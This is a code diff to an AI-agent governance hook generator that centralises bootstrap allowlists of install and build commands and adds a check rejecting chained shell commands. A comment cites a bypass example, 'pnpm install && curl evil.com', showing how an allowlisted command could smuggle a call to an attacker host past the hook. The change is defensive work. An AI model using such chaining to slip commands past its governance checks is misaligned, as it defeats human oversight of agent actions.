@@ -168,35 +168,14 @@ echo "Then run: scripts/write-persona.sh <driver> <role>"
 exit 0
 `;
 
-/**
- * Bootstrap-safe commands that should be allowed through when the kernel binary
- * is not yet available. These are the minimum commands needed to install
- * dependencies and build the project so the kernel can become available.
- *
- * This resolves the catch-22 where the governance hook blocks `pnpm install`
- * before the kernel binary exists. See: AgentGuardHQ/agentguard#995
- */
-export const BOOTSTRAP_COMMANDS = [
-  'pnpm install',
-  'pnpm i',
-  'npm install',
-  'npm ci',
-  'npm i',
-  'yarn install',
-  'yarn',
-  'pnpm build',
-  'npm run build',
-  'yarn build',
-  'npx turbo build',
-  'pnpm turbo build',
-];
-
-/**
- * Read-only tools that are safe to allow through during bootstrap.
- * These cannot mutate state and blocking them prevents agents from
- * even reading files to understand the project structure.
- */
-export const BOOTSTRAP_SAFE_TOOLS = ['Read', 'Glob', 'Grep', 'LS', 'WebSearch', 'WebFetch'];
+// Bootstrap allowlists imported from the single source of truth.
+// Re-exported for backward compatibility with tests that import from this module.
+import {
+  BOOTSTRAP_SAFE_COMMANDS,
+  BOOTSTRAP_SAFE_TOOLS as BOOTSTRAP_SAFE_TOOLS_SET,
+} from '../bootstrap.js';
+export { BOOTSTRAP_SAFE_COMMANDS as BOOTSTRAP_COMMANDS };
+export const BOOTSTRAP_SAFE_TOOLS = [...BOOTSTRAP_SAFE_TOOLS_SET];
 
 /** Hook wrapper template — needs CLI prefix injected */
 export function claudeHookWrapper(
@@ -210,8 +189,12 @@ export function claudeHookWrapper(
 
   // Build the bootstrap allowlist patterns for the shell script.
   // Each pattern matches the start of a Bash command in the hook payload.
-  const bootstrapPatterns = BOOTSTRAP_COMMANDS.map((cmd) => `  *'"command":"${cmd}'* ) BOOTSTRAP_SAFE=1 ;;`).join('\n');
-  const bootstrapToolPatterns = BOOTSTRAP_SAFE_TOOLS.map((tool) => `  *'"tool_name":"${tool}"'* ) BOOTSTRAP_SAFE=1 ;;`).join('\n');
+  const bootstrapPatterns = BOOTSTRAP_SAFE_COMMANDS.map(
+    (cmd) => `  *'"command":"${cmd}'* ) BOOTSTRAP_SAFE=1 ;;`
+  ).join('\n');
+  const bootstrapToolPatterns = BOOTSTRAP_SAFE_TOOLS.map(
+    (tool) => `  *'"tool_name":"${tool}"'* ) BOOTSTRAP_SAFE=1 ;;`
+  ).join('\n');
 
   const resolveBlock = isLocal
     ? `AGENTGUARD_BIN="${cliPrefix}"`
@@ -241,6 +224,15 @@ ${bootstrapPatterns}
   case "\$HOOK_PAYLOAD" in
 ${bootstrapToolPatterns}
   esac
+
+  # SECURITY: reject if command contains chaining operators (&&, ||, ;, |, backtick)
+  # This prevents bypasses like "pnpm install && curl evil.com"
+  if [ "\$BOOTSTRAP_SAFE" -eq 1 ]; then
+    CMD_VALUE=\$(echo "\$HOOK_PAYLOAD" | grep -oP '"command"\\s*:\\s*"\\K[^"]*' | head -1)
+    if echo "\$CMD_VALUE" | grep -qE '&&|\\|\\||[;\x60]|\\|[^|]'; then
+      BOOTSTRAP_SAFE=0
+    fi
+  fi
 
   if [ "\$BOOTSTRAP_SAFE" -eq 1 ]; then
     # Allow through — emit a warning so the agent knows governance is not active
